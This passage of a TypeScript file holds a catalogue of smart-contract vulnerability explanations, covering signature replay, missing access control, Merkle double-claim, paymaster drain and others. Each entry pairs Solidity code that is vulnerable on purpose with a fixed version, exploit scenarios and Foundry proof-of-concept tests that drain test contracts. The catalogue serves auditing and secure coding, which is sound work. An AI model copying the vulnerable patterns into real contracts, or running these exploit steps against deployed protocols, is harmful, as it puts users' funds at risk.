    address public feeRecipient;

    error ZeroAddress();

    function setOwner(address newOwner) external onlyOwner {
        if (newOwner == address(0)) revert ZeroAddress();
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function setFeeRecipient(address recipient) external onlyOwner {
        if (recipient == address(0)) revert ZeroAddress();
        feeRecipient = recipient;
    }

    // Constructor also needs validation
    constructor(address _owner, address _feeRecipient) {
        if (_owner == address(0) || _feeRecipient == address(0)) revert ZeroAddress();
        owner = _owner;
        feeRecipient = _feeRecipient;
    }
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableVault} from "src/VulnerableVault.sol";

contract ZeroAddressTest is Test {
    VulnerableVault public vault;
    address owner = makeAddr("owner");

    function setUp() public {
        vm.prank(owner);
        vault = new VulnerableVault(owner);
    }

    function test_zeroAddressBricksAdmin() public {
        // Admin accidentally sets owner to zero
        vm.prank(owner);
        vault.setOwner(address(0));

        // Now all admin functions are permanently locked
        vm.prank(owner);
        vm.expectRevert(); // onlyOwner check fails — owner is address(0)
        vault.emergencyWithdraw();
    }
}`,
    remediation: [
      "Add if (addr == address(0)) revert ZeroAddress() for every address parameter that represents a critical role",
      "Use OpenZeppelin's Ownable2Step instead of direct ownership transfer — requires the new owner to accept",
      "Validate address parameters in constructors, not just setters",
      "Consider using custom errors (revert ZeroAddress()) instead of require strings for gas efficiency",
    ],
    references: [
      "https://docs.openzeppelin.com/contracts/api/access#Ownable2Step",
      "https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation",
    ],
  },

  "CUSTOM-006": {
    id: "CUSTOM-006",
    title: "Missing Events for Critical State Changes",
    severity: Severity.LOW,
    rootCause:
      "Critical state changes (ownership transfer, parameter updates, role grants) without " +
      "corresponding events make off-chain monitoring impossible. Indexers, bots, and frontends " +
      "have no way to detect or react to these changes.",
    impactDescription:
      "Governance tooling, security monitoring, and user-facing frontends cannot track protocol " +
      "state. Malicious owner changes or parameter updates go undetected until users are harmed. " +
      "Many security monitoring services rely entirely on events.",
    exploitScenario: [
      "1. Protocol's owner key is compromised",
      "2. Attacker silently changes fee rate to 100% and oracle to a manipulated feed",
      "3. No events emitted — monitoring bots don't detect the change",
      "4. Users continue interacting, paying 100% fees and using manipulated prices",
      "5. By the time the change is noticed, significant funds are lost",
    ],
    vulnerableCode: `// VULNERABLE: critical changes without events
contract Protocol {
    uint256 public feeRate;
    address public oracle;
    address public owner;

    // ❌ No event emitted — change is invisible off-chain
    function setFeeRate(uint256 newRate) external onlyOwner {
        feeRate = newRate;
    }

    function setOracle(address newOracle) external onlyOwner {
        oracle = newOracle;
    }
}`,
    secureCode: `// SECURE: emit events for all critical state changes
contract Protocol {
    uint256 public feeRate;
    address public oracle;
    address public owner;

    event FeeRateUpdated(uint256 oldRate, uint256 newRate);
    event OracleUpdated(address indexed oldOracle, address indexed newOracle);
    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);

    function setFeeRate(uint256 newRate) external onlyOwner {
        require(newRate <= 1000, "Fee too high"); // 10% max
        emit FeeRateUpdated(feeRate, newRate);
        feeRate = newRate;
    }

    function setOracle(address newOracle) external onlyOwner {
        require(newOracle != address(0), "Zero address");
        emit OracleUpdated(oracle, newOracle);
        oracle = newOracle;
    }
}`,
    pocTemplate: `// This vulnerability is about monitoring, not direct exploitation.
// Use Slither to detect it:
//   slither . --detect events-maths,events-access

// Test that events ARE emitted:
contract EventTest is Test {
    Protocol public protocol;
    address owner = makeAddr("owner");

    function test_feeRateEmitsEvent() public {
        vm.prank(owner);
        // ✅ Assert the event is emitted
        vm.expectEmit(true, true, false, true, address(protocol));
        emit Protocol.FeeRateUpdated(0, 500);
        protocol.setFeeRate(500);
    }
}`,
    remediation: [
      "Emit events for every state variable change that affects protocol behaviour",
      "Include both old and new values in events to make diffs trackable",
      "Use indexed parameters for addresses so they can be efficiently filtered",
      "Add Slither detector events-access and events-maths to CI",
    ],
    references: [
      "https://github.com/crytic/slither/wiki/Detector-Documentation#missing-events-access-control",
      "https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/events/",
    ],
  },

  "CUSTOM-011": {
    id: "CUSTOM-011",
    title: "Signature Without Replay Protection",
    severity: Severity.HIGH,
    rootCause:
      "Off-chain signatures that don't include a nonce, chain ID, or contract address can be " +
      "replayed: once a valid signature is broadcast, anyone can re-submit it to execute the " +
      "same operation again, or submit it on a different chain/contract.",
    impactDescription:
      "An attacker can replay a victim's valid signature to execute the same authorized action " +
      "multiple times (drain funds via repeated withdrawals) or across chains/contracts " +
      "where the same key is used.",
    exploitScenario: [
      "1. User signs a message authorizing withdrawal of 100 tokens",
      "2. Contract verifies the signature and executes the withdrawal",
      "3. Attacker saves the signature and submits it again",
      "4. Contract verifies it again (same valid signature) and executes another 100 token withdrawal",
      "5. Repeats until the user's balance is drained",
    ],
    vulnerableCode: `// VULNERABLE: signature without nonce or domain separator
function withdraw(uint256 amount, bytes calldata sig) external {
    // ❌ Message only contains (amount) — same sig valid forever
    bytes32 hash = keccak256(abi.encodePacked(amount));
    address signer = hash.toEthSignedMessageHash().recover(sig);
    require(signer == owner, "Invalid sig");
    token.transfer(msg.sender, amount);
}`,
    secureCode: `// SECURE: EIP-712 with nonce + chain ID + contract address
import "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract SecureWithdraw is EIP712 {
    mapping(address => uint256) public nonces;

    bytes32 constant WITHDRAW_TYPEHASH = keccak256(
        "Withdraw(address user,uint256 amount,uint256 nonce,uint256 deadline)"
    );

    function withdraw(
        uint256 amount,
        uint256 deadline,
        bytes calldata sig
    ) external {
        require(block.timestamp <= deadline, "Expired");

        bytes32 structHash = keccak256(abi.encode(
            WITHDRAW_TYPEHASH,
            msg.sender,
            amount,
            nonces[msg.sender]++, // ✅ nonce incremented after use
            deadline
        ));

        address signer = ECDSA.recover(_hashTypedDataV4(structHash), sig);
        require(signer == owner, "Invalid sig");
        token.transfer(msg.sender, amount);
    }
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableWithdraw} from "src/VulnerableWithdraw.sol";

contract SignatureReplayTest is Test {
    VulnerableWithdraw public vault;
    uint256 ownerKey = 0xA11CE;
    address owner = vm.addr(ownerKey);

    function setUp() public {
        vault = new VulnerableWithdraw(owner);
        deal(address(vault.token()), address(vault), 1000e18);
    }

    function test_signatureReplay() public {
        uint256 amount = 100e18;
        bytes32 hash = keccak256(abi.encodePacked(amount))
            .toEthSignedMessageHash();
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerKey, hash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // First withdrawal
        vault.withdraw(amount, sig);

        // Replay the same signature
        vault.withdraw(amount, sig); // Should revert but doesn't

        assertEq(vault.token().balanceOf(address(this)), 200e18, "Replayed!");
    }
}`,
    remediation: [
      "Use EIP-712 structured data signing with a domain separator (chain ID + contract address + name)",
      "Include a per-user nonce in every signed message and increment it on use",
      "Add a deadline/expiry to prevent indefinite reuse of valid signatures",
      "Track used signatures with a mapping(bytes32 => bool) usedHashes if nonces don't apply",
      "Use OpenZeppelin's EIP712 base contract for standardized implementation",
    ],
    references: [
      "https://eips.ethereum.org/EIPS/eip-712",
      "https://docs.openzeppelin.com/contracts/api/utils#EIP712",
      "https://swcregistry.io/docs/SWC-121",
    ],
  },

  "CUSTOM-013": {
    id: "CUSTOM-013",
    title: "Hash Collision via abi.encodePacked",
    severity: Severity.MEDIUM,
    rootCause:
      "abi.encodePacked concatenates arguments without length prefixes. When two or more dynamic " +
      "types (string, bytes, arrays) are packed together, different inputs can produce identical " +
      "byte sequences — creating hash collisions that break security invariants.",
    impactDescription:
      "An attacker can craft inputs that hash to the same value as a legitimate authorized " +
      "payload, bypassing signature verification, Merkle proofs, or access control checks that " +
      "rely on the hash being unique.",
    exploitScenario: [
      "1. Contract stores keccak256(abi.encodePacked(tokenA, tokenB)) as a pair identifier",
      "2. Attacker notices encodePacked('AB', 'C') == encodePacked('A', 'BC')",
      "3. Attacker creates a pool with different token strings that hash to an existing pair ID",
      "4. Attacker can drain or manipulate the existing pool by impersonating its identifier",
    ],
    vulnerableCode: `// VULNERABLE: dynamic types in encodePacked
function hashPair(string memory a, string memory b) internal pure returns (bytes32) {
    // ❌ encodePacked("AB","C") == encodePacked("A","BC") == 0x414243
    return keccak256(abi.encodePacked(a, b));
}

// VULNERABLE: in signature verification
function verify(address user, uint256[] memory ids, bytes calldata sig) external {
    bytes32 hash = keccak256(abi.encodePacked(user, ids)); // ❌ ids is dynamic
    require(recoverSigner(hash, sig) == trustedSigner);
}`,
    secureCode: `// SECURE: use abi.encode instead (adds length prefixes)
function hashPair(string memory a, string memory b) internal pure returns (bytes32) {
    // ✅ abi.encode("AB","C") != abi.encode("A","BC")
    return keccak256(abi.encode(a, b));
}

// SECURE: EIP-712 for structured data
bytes32 constant TYPEHASH = keccak256("Claim(address user,uint256[] ids)");

function hashClaim(address user, uint256[] memory ids) internal pure returns (bytes32) {
    return keccak256(abi.encode(TYPEHASH, user, keccak256(abi.encodePacked(ids))));
    // ✅ Arrays in EIP-712 are hashed first, eliminating collision risk
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

contract HashCollisionTest is Test {
    function test_encodePackedCollision() public pure {
        // Demonstrate the collision
        bytes32 h1 = keccak256(abi.encodePacked("AB", "C"));
        bytes32 h2 = keccak256(abi.encodePacked("A", "BC"));
        assert(h1 == h2); // ✅ Collision confirmed!

        // Encode does NOT collide
        bytes32 e1 = keccak256(abi.encode("AB", "C"));
        bytes32 e2 = keccak256(abi.encode("A", "BC"));
        assert(e1 != e2); // ✅ Safe
    }
}`,
    remediation: [
      "Replace abi.encodePacked(dynamic1, dynamic2) with abi.encode(dynamic1, dynamic2)",
      "Use abi.encodePacked only when all arguments are fixed-size types (uint, address, bytes32)",
      "For Merkle leaf hashing, double-hash or use abi.encode: keccak256(abi.encode(leaf))",
      "Use EIP-712 structured data for signature schemes — it handles dynamic types correctly",
    ],
    references: [
      "https://docs.soliditylang.org/en/latest/abi-spec.html#non-standard-packed-mode",
      "https://github.com/crytic/slither/wiki/Detector-Documentation#abi-encodePacked-collision",
      "https://swcregistry.io/docs/SWC-133",
    ],
  },

  "CUSTOM-015": {
    id: "CUSTOM-015",
    title: "Division Before Multiplication (Precision Loss)",
    severity: Severity.MEDIUM,
    rootCause:
      "Integer division in Solidity truncates toward zero. If division happens before multiplication " +
      "in a calculation, precision is lost and the final result may be significantly smaller than " +
      "the mathematically correct value.",
    impactDescription:
      "Fee calculations can be rounded to zero, allowing users to trade for free. Reward " +
      "distributions can be severely underestimated. Collateral ratios can appear satisfied " +
      "when they are not — creating bad debt or preventing valid liquidations.",
    exploitScenario: [
      "1. Protocol calculates fee as: amount * feeRate / 10000",
      "2. Due to operator precedence, code is written as: amount / 10000 * feeRate",
      "3. For amount = 9999 and feeRate = 100 (1%): 9999 / 10000 = 0, then 0 * 100 = 0",
      "4. Attacker trades 9999 wei per transaction, paying zero fees indefinitely",
    ],
    vulnerableCode: `// VULNERABLE: division before multiplication
function calculateFee(uint256 amount, uint256 feeRate) internal pure returns (uint256) {
    // ❌ Integer division truncates: for small amounts, result is 0
    return amount / 10000 * feeRate;
    // Example: 9999 / 10000 = 0 → 0 * 100 = 0 (should be ~99)
}

// ALSO VULNERABLE: intermediate division in longer expression
function calculateReward(uint256 stake, uint256 totalStake, uint256 rewardPool) internal pure returns (uint256) {
    return stake / totalStake * rewardPool; // ❌
}`,
    secureCode: `// SECURE: multiply before dividing
function calculateFee(uint256 amount, uint256 feeRate) internal pure returns (uint256) {
    // ✅ Multiply first to preserve precision
    return amount * feeRate / 10000;
    // Example: 9999 * 100 = 999900 → 999900 / 10000 = 99
}

// SECURE: for very high precision, use a scaling factor
function calculateReward(uint256 stake, uint256 totalStake, uint256 rewardPool) internal pure returns (uint256) {
    // ✅ Multiply before dividing
    return stake * rewardPool / totalStake;
    // Or for extra precision: stake * rewardPool * 1e18 / totalStake / 1e18
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableDex} from "src/VulnerableDex.sol";

contract PrecisionLossTest is Test {
    VulnerableDex public dex;

    function setUp() public {
        dex = new VulnerableDex();
    }

    function test_zeroFeeExploit() public {
        uint256 amount = 9999; // Just below fee threshold

        uint256 feePaid = dex.calculateFee(amount, 100); // 1% fee
        assertEq(feePaid, 0, "Fee rounds to zero — free trading!");

        // Attacker can make many small trades, paying no fees
        for (uint256 i = 0; i < 100; i++) {
            dex.swap(amount); // Each costs 0 in fees
        }
    }
}`,
    remediation: [
      "Always multiply before dividing: return a * b / c, never a / c * b",
      "Be careful with Solidity operator precedence — use explicit parentheses",
      "For financial calculations, consider using a fixed-point library (PRBMath, FixedPoint)",
      "Add fuzz tests that verify fee >= 0 for all input ranges and monotone properties",
      "Document and test minimum meaningful input sizes for all fee/reward functions",
    ],
    references: [
      "https://github.com/crytic/slither/wiki/Detector-Documentation#divide-before-multiply",
      "https://dacian.me/precision-loss-in-financial-calculations",
    ],
  },

  "CUSTOM-016": {
    id: "CUSTOM-016",
    title: "Permit Without Deadline",
    severity: Severity.MEDIUM,
    rootCause:
      "EIP-2612 permits without a deadline (or with deadline = type(uint256).max) remain valid " +
      "indefinitely. If the private key is later compromised, or the permit was obtained via " +
      "phishing, the attacker can replay it at any future time.",
    impactDescription:
      "Permits with no deadline are permanent delegations. A compromised or phished permit " +
      "can be replayed months later to drain the victim's token allowance, even after they " +
      "believe the risk has passed.",
    exploitScenario: [
      "1. User signs a permit with deadline = type(uint256).max (never expires)",
      "2. Signature is obtained via phishing or leaked log",
      "3. Attacker waits until the user has more tokens (e.g. after vesting)",
      "4. Attacker submits the permit + transferFrom, draining all tokens",
    ],
    vulnerableCode: `// VULNERABLE: no deadline validation
function deposit(
    uint256 amount,
    uint256 deadline,
    uint8 v, bytes32 r, bytes32 s
) external {
    // ❌ Accepts deadline = type(uint256).max — never expires
    token.permit(msg.sender, address(this), amount, deadline, v, r, s);
    token.transferFrom(msg.sender, address(this), amount);
    balances[msg.sender] += amount;
}`,
    secureCode: `// SECURE: enforce a reasonable deadline window
uint256 public constant MAX_PERMIT_VALIDITY = 1 hours;

function deposit(
    uint256 amount,
    uint256 deadline,
    uint8 v, bytes32 r, bytes32 s
) external {
    // ✅ Deadline must be within a reasonable window
    require(deadline <= block.timestamp + MAX_PERMIT_VALIDITY, "Deadline too far");
    require(deadline >= block.timestamp, "Deadline in past");

    token.permit(msg.sender, address(this), amount, deadline, v, r, s);
    token.transferFrom(msg.sender, address(this), amount);
    balances[msg.sender] += amount;
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableVault} from "src/VulnerableVault.sol";
import {ERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Permit.sol";

contract PermitNoDeadlineTest is Test {
    VulnerableVault public vault;
    ERC20Permit public token;
    uint256 victimKey = 0xBEEF;
    address victim = vm.addr(victimKey);

    function setUp() public {
        token = new ERC20Permit("Token", "TKN");
        vault = new VulnerableVault(address(token));
        deal(address(token), victim, 1000e18);
    }

    function test_permitReplayAfterLongTime() public {
        // Sign permit with max deadline
        uint256 deadline = type(uint256).max;
        (uint8 v, bytes32 r, bytes32 s) = signPermit(victimKey, 1000e18, deadline);

        // Warp 1 year into the future
        vm.warp(block.timestamp + 365 days);

        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        // Permit still valid — attacker drains victim's tokens
        vault.deposit(1000e18, deadline, v, r, s);
        // ...and withdraws to themselves
    }
}`,
    remediation: [
      "Enforce a maximum deadline: require(deadline <= block.timestamp + MAX_VALIDITY)",
      "Recommend short permit windows in documentation (minutes to hours, not forever)",
      "Consider using EIP-4494 (NFT) or Permit2 (Uniswap) which have better deadline semantics",
      "Educate users to sign permits with short deadlines when prompted by frontends",
    ],
    references: [
      "https://eips.ethereum.org/EIPS/eip-2612",
      "https://github.com/Uniswap/permit2",
      "https://code4rena.com/reports/2023-01-biconomy#m-05-permit-without-deadline",
    ],
  },

  "CUSTOM-017": {
    id: "CUSTOM-017",
    title: "Missing Access Control on Critical Function",
    severity: Severity.CRITICAL,
    rootCause:
      "Functions that modify critical protocol parameters (fee rates, oracle addresses, " +
      "pause state, ownership) without any access control modifier allow any external caller " +
      "to execute privileged operations.",
    impactDescription:
      "Any attacker can call the unprotected function to: drain treasury via fee manipulation, " +
      "replace oracle with a malicious feed, take ownership of the contract, disable the protocol, " +
      "or mint unlimited tokens.",
    exploitScenario: [
      "1. Protocol has setFeeRecipient(address) without onlyOwner modifier",
      "2. Attacker calls setFeeRecipient(attacker_address)",
      "3. All future protocol fees are redirected to the attacker",
      "4. Attacker profits passively until the issue is noticed",
    ],
    vulnerableCode: `// VULNERABLE: no access control
contract Protocol {
    address public feeRecipient;
    uint256 public feeRate;
    bool public paused;

    // ❌ Anyone can call this
    function setFeeRecipient(address recipient) external {
        feeRecipient = recipient;
    }

    // ❌ Anyone can pause the protocol
    function setPaused(bool _paused) external {
        paused = _paused;
    }

    // ❌ Missing modifier on critical function
    function setFeeRate(uint256 rate) external {
        feeRate = rate;
    }
}`,
    secureCode: `// SECURE: role-based access control
import "@openzeppelin/contracts/access/AccessControl.sol";

contract Protocol is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");

    address public feeRecipient;
    uint256 public feeRate;
    bool public paused;

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ADMIN_ROLE, admin);
        _grantRole(PAUSER_ROLE, admin);
    }

    // ✅ Only admin can change fee recipient
    function setFeeRecipient(address recipient) external onlyRole(ADMIN_ROLE) {
        require(recipient != address(0), "Zero address");
        feeRecipient = recipient;
    }

    // ✅ Separate role for pausing
    function setPaused(bool _paused) external onlyRole(PAUSER_ROLE) {
        paused = _paused;
    }
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableProtocol} from "src/VulnerableProtocol.sol";

contract MissingAccessControlTest is Test {
    VulnerableProtocol public protocol;
    address attacker = makeAddr("attacker");

    function setUp() public {
        protocol = new VulnerableProtocol();
    }

    function test_anyoneCanSetFeeRecipient() public {
        vm.prank(attacker);
        // Should revert but doesn't
        protocol.setFeeRecipient(attacker);

        assertEq(protocol.feeRecipient(), attacker, "Attacker stole fee stream");
    }

    function test_anyoneCanPause() public {
        vm.prank(attacker);
        protocol.setPaused(true); // DoS the protocol
        assertTrue(protocol.paused());
    }
}`,
    remediation: [
      "Add onlyOwner or role-based modifiers to every function that modifies critical state",
      "Use OpenZeppelin AccessControl for fine-grained role separation (admin, pauser, upgrader)",
      "Prefer Ownable2Step over Ownable to prevent accidental ownership loss",
      "Run Slither with --detect unprotected-upgrade,missing-zero-check on CI",
      "Perform a full permission matrix review: for each function, who should be allowed to call it?",
    ],
    references: [
      "https://docs.openzeppelin.com/contracts/api/access#AccessControl",
      "https://github.com/crytic/slither/wiki/Detector-Documentation#unprotected-upgrade",
      "https://swcregistry.io/docs/SWC-105",
    ],
  },

  "CUSTOM-029": {
    id: "CUSTOM-029",
    title: "Merkle Double-Claim",
    severity: Severity.HIGH,
    rootCause:
      "Merkle airdrop contracts that don't track claimed addresses allow a valid Merkle proof " +
      "to be submitted multiple times. Each submission passes verification and triggers a payout, " +
      "draining the airdrop contract.",
    impactDescription:
      "An attacker with a valid Merkle leaf can claim their allocation repeatedly until the " +
      "airdrop pool is drained, stealing tokens from all other legitimate claimants.",
    exploitScenario: [
      "1. Airdrop contract stores a Merkle root of (address, amount) pairs",
      "2. Contract has no bitmap or mapping to record who has already claimed",
      "3. Attacker submits valid proof for their allocation",
      "4. Attacker submits the exact same proof again — it passes verification",
      "5. Attacker repeats until the contract has no tokens left",
    ],
    vulnerableCode: `// VULNERABLE: no claimed tracking
contract MerkleAirdrop {
    bytes32 public merkleRoot;
    IERC20 public token;

    function claim(
        address account,
        uint256 amount,
        bytes32[] calldata proof
    ) external {
        // ❌ No check that account already claimed
        bytes32 leaf = keccak256(abi.encodePacked(account, amount));
        require(MerkleProof.verify(proof, merkleRoot, leaf), "Invalid proof");
        token.transfer(account, amount); // ❌ Can be called infinitely
    }
}`,
    secureCode: `// SECURE: bitmap-based claimed tracking
contract MerkleAirdrop {
    bytes32 public merkleRoot;
    IERC20 public token;

    // ✅ Track claimed status with a bitmap (gas-efficient)
    mapping(uint256 => uint256) private claimedBitMap;

    function isClaimed(uint256 index) public view returns (bool) {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        uint256 claimedWord = claimedBitMap[claimedWordIndex];
        uint256 mask = (1 << claimedBitIndex);
        return claimedWord & mask == mask;
    }

    function _setClaimed(uint256 index) private {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        claimedBitMap[claimedWordIndex] |= (1 << claimedBitIndex);
    }

    function claim(
        uint256 index,
        address account,
        uint256 amount,
        bytes32[] calldata proof
    ) external {
        // ✅ Check and mark claimed in one function
        require(!isClaimed(index), "Already claimed");

        bytes32 leaf = keccak256(abi.encodePacked(index, account, amount));
        require(MerkleProof.verify(proof, merkleRoot, leaf), "Invalid proof");

        _setClaimed(index);
        token.transfer(account, amount);
        emit Claimed(index, account, amount);
    }
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableAirdrop} from "src/VulnerableAirdrop.sol";

contract MerkleDoubleClaimTest is Test {
    VulnerableAirdrop public airdrop;
    address attacker = makeAddr("attacker");
    bytes32[] public proof; // Pre-generated Merkle proof for attacker

    function setUp() public {
        // Setup airdrop with 1000 tokens, attacker allocation = 10
        airdrop = new VulnerableAirdrop(merkleRoot, address(token));
        deal(address(token), address(airdrop), 1000e18);
        proof = generateProof(attacker, 10e18);
    }

    function test_doubleClaimDrain() public {
        uint256 balBefore = token.balanceOf(attacker);

        vm.startPrank(attacker);
        // Claim 100 times — only 10 tokens allocated but no tracking
        for (uint256 i = 0; i < 100; i++) {
            airdrop.claim(attacker, 10e18, proof);
        }
        vm.stopPrank();

        assertEq(token.balanceOf(attacker), balBefore + 1000e18, "Drained the airdrop");
    }
}`,
    remediation: [
      "Use a mapping(address => bool) hasClaimed or a bitmap for gas-efficient tracking",
      "Include an index in the Merkle leaf: keccak256(abi.encodePacked(index, account, amount))",
      "Emit events on claim and verify they can't be replayed by checking claimed status first",
      "Use OpenZeppelin's MerkleProof.verify() with a checked index as reference implementation",
    ],
    references: [
      "https://github.com/Uniswap/merkle-distributor",
      "https://docs.openzeppelin.com/contracts/api/utils#MerkleProof",
      "https://github.com/code-423n4/2022-04-backed-findings/issues/78",
    ],
  },

  "CUSTOM-032": {
    id: "CUSTOM-032",
    title: "ERC-4337 Paymaster Drain",
    severity: Severity.CRITICAL,
    rootCause:
      "ERC-4337 Paymasters sponsor gas for UserOperations. If validatePaymasterUserOp does not " +
      "strictly validate the sender and operation, attackers can craft UserOperations that " +
      "get sponsored by the paymaster without meeting the intended criteria.",
    impactDescription:
      "An attacker can drain the paymaster's deposit in the EntryPoint by submitting " +
      "sponsored UserOperations that consume gas without legitimate use.",
    exploitScenario: [
      "1. Paymaster is deployed to sponsor gas for users of dApp X",
      "2. Paymaster's validatePaymasterUserOp doesn't check callData target",
      "3. Attacker creates UserOperation calling any expensive contract (not dApp X)",
      "4. Paymaster sponsores the gas (validation passes)",
      "5. Attacker repeats until paymaster deposit is drained",
    ],
    vulnerableCode: `// VULNERABLE: no sender validation in paymaster
function validatePaymasterUserOp(
    UserOperation calldata userOp,
    bytes32 userOpHash,
    uint256 maxCost
) external override returns (bytes memory context, uint256 validationData) {
    // ❌ No validation of sender, callData target, or gas budget
    return (abi.encode(userOp.sender), 0); // Always approves
}`,
    secureCode: `// SECURE: full validation
mapping(address => uint256) public gasUsed;
uint256 public constant MAX_GAS_PER_USER = 1_000_000;
address public allowedTarget;

function validatePaymasterUserOp(
    UserOperation calldata userOp,
    bytes32 userOpHash,
    uint256 maxCost
) external override returns (bytes memory context, uint256 validationData) {
    // ✅ Check sender whitelist or criteria
    require(isEligible(userOp.sender), "Not eligible for sponsorship");

    // ✅ Check callData target
    address target = address(bytes20(userOp.callData[16:36]));
    require(target == allowedTarget, "Target not sponsored");

    // ✅ Enforce per-user gas budget
    require(gasUsed[userOp.sender] + maxCost <= MAX_GAS_PER_USER, "Gas budget exceeded");

    return (abi.encode(userOp.sender, maxCost), 0);
}`,
    pocTemplate: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerablePaymaster} from "src/VulnerablePaymaster.sol";
import {EntryPoint} from "@account-abstraction/contracts/core/EntryPoint.sol";

contract PaymasterDrainTest is Test {
    EntryPoint public entryPoint;
    VulnerablePaymaster public paymaster;
    address attacker = makeAddr("attacker");

    function setUp() public {
        entryPoint = new EntryPoint();
        paymaster = new VulnerablePaymaster(entryPoint);
        // Fund paymaster
        entryPoint.depositTo{value: 10 ether}(address(paymaster));
    }

    function test_paymasterDrain() public {
        uint256 depositBefore = entryPoint.balanceOf(address(paymaster));

        // Attacker submits gas-heavy UserOperation targeting arbitrary contract
        UserOperation memory op = buildMaliciousOp(attacker, address(paymaster));
        entryPoint.handleOps(toArray(op), payable(attacker));

        uint256 depositAfter = entryPoint.balanceOf(address(paymaster));
        assertLt(depositAfter, depositBefore, "Paymaster was drained");
    }
}`,
    remediation: [
      "Always validate userOp.sender against a whitelist or eligibility criteria",
      "Validate the callData target to ensure it points to the intended contract",
      "Implement per-user gas quotas and track usage in a mapping",
      "Consider time-based quota resets (daily/weekly gas allowance)",
      "Use postOp to track and refund or penalize based on actual gas used",
    ],
    references: [
      "https://eips.ethereum.org/EIPS/eip-4337",
      "https://docs.stackup.sh/docs/paymaster-overview",
      "https://github.com/eth-infinitism/account-abstraction/tree/develop/contracts/samples",
    ],
  },
};

// ============================================================================
// Fuzzy matching for free-text queries
// ============================================================================

function findExplanation(query: string): FindingExplanation | undefined {
  const q = query.toLowerCase().trim();

  // Direct ID match
  const directMatch =
    FINDING_DATABASE[query.toUpperCase()] ??
    FINDING_DATABASE[query.toUpperCase().replace(/[^A-Z0-9-]/g, "")];
  if (directMatch) return directMatch;

  // Keyword matching
  const keywordMap: Record<string, string> = {
    reentrancy: "SWC-107",
    "re-entrancy": "SWC-107",
    "cross-function": "SWC-107",
    "tx.origin": "SWC-115",
    "tx origin": "SWC-115",
    phishing: "SWC-115",
    oracle: "CUSTOM-004",
    "flash loan": "CUSTOM-004",
    "price manipulation": "CUSTOM-004",
    "spot price": "CUSTOM-004",
    "erc-7702": "CUSTOM-018",
    erc7702: "CUSTOM-018",
    "set code": "CUSTOM-018",
    initialize: "CUSTOM-018",
    paymaster: "CUSTOM-032",
    "erc-4337": "CUSTOM-032",
    "account abstraction": "CUSTOM-032",
    "4337": "CUSTOM-032",
    // SWC-101 — Integer Overflow/Underflow
    overflow: "SWC-101",
    underflow: "SWC-101",
    "integer overflow": "SWC-101",
    "integer underflow": "SWC-101",
    safemath: "SWC-101",
    "safe math": "SWC-101",
    // SWC-103 — Floating Pragma
    "floating pragma": "SWC-103",
    pragma: "SWC-103",
    "compiler version": "SWC-103",
    // SWC-104 — Unchecked Return Value
    "unchecked return": "SWC-104",
    "return value": "SWC-104",
    safeerc20: "SWC-104",
    "safe transfer": "SWC-104",
    "silent failure": "SWC-104",
    // SWC-116 — Timestamp Dependence
    timestamp: "SWC-116",
    "block.timestamp": "SWC-116",
    "timestamp dependence": "SWC-116",
    "time dependence": "SWC-116",
    // SWC-112 — Delegatecall to Untrusted Callee
    delegatecall: "SWC-112",
    "delegate call": "SWC-112",
    "untrusted callee": "SWC-112",
    // CUSTOM-001 — Array Length Mismatch
    "array length": "CUSTOM-001",
    "length mismatch": "CUSTOM-001",
    "array mismatch": "CUSTOM-001",
    "batch transfer": "CUSTOM-001",
    // CUSTOM-005 — Missing Zero Address Validation
    "zero address": "CUSTOM-005",
    "address(0)": "CUSTOM-005",
    "missing zero address": "CUSTOM-005",
    // CUSTOM-006 — Missing Events
    "missing event": "CUSTOM-006",
    "missing events": "CUSTOM-006",
    "event emission": "CUSTOM-006",
    // CUSTOM-011 — Signature Replay
    replay: "CUSTOM-011",
    "signature replay": "CUSTOM-011",
    "replay protection": "CUSTOM-011",
    nonce: "CUSTOM-011",
    "eip-712": "CUSTOM-011",
    // CUSTOM-013 — Hash Collision via encodePacked
    encodepacked: "CUSTOM-013",
    "abi.encodepacked": "CUSTOM-013",
    "hash collision": "CUSTOM-013",
    // CUSTOM-015 — Division Before Multiplication
    "division before multiplication": "CUSTOM-015",
    "precision loss": "CUSTOM-015",
    "divide before multiply": "CUSTOM-015",
    // CUSTOM-016 — Permit Without Deadline
    permit: "CUSTOM-016",
    "permit deadline": "CUSTOM-016",
    "eip-2612": "CUSTOM-016",
    // CUSTOM-017 — Missing Access Control
    "access control": "CUSTOM-017",
    "missing access control": "CUSTOM-017",
    "unprotected function": "CUSTOM-017",
    // CUSTOM-029 — Merkle Double-Claim
    merkle: "CUSTOM-029",
    airdrop: "CUSTOM-029",
    "double claim": "CUSTOM-029",
